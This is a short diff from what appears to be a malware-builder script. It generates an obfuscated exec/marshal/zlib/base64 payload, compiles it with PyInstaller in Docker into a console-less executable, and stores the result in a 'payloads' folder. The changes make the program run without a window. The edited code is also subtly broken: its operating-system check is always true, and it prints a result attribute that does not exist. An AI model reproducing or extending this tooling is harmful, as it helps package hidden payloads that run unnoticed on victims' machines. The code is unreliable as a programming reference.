@@ -180,13 +180,13 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         
 
         if os_name == "Windows":
-            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
-            print(result)
+            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F --noconsole {payload_file_name}.py"', shell=True, capture_output=True)
+            print(result.result)
             shutil.copy(f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe")
 
         elif os_name == "Darwin" or "Linux":
-            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
-            print(result)
+            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F --noconsole {payload_file_name}.py"', shell=True, capture_output=True)
+            print(result.result)
             shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
         os.remove(f"{payload_file_name}.py")
